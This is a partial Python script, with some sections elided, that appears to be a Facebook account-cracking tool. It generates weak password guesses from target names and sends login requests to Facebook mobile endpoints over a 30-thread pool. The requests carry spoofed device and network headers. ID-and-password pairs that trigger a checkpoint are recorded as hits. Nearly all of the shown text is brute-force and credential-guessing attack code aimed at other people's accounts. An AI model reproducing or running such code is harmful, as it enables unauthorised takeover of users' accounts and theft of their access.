...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['1122334455','1234554321','112233445566','123456654321','20002000','20012001']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack2(idf,pwv):
	...
	for pw in pwv:
		try:
			head = {"x-fb-connection-bandwidth": str(random.randint(2e+07, 3e+07)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
...
def crack3(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://mbaisc.facebook.com/login/?email='+idf).text
			dataa ={
...
'accept-language':'ar-AR,en-US;q=0.9,en;q=0.8'})
			...
			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=0&refsrc=deprecated',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
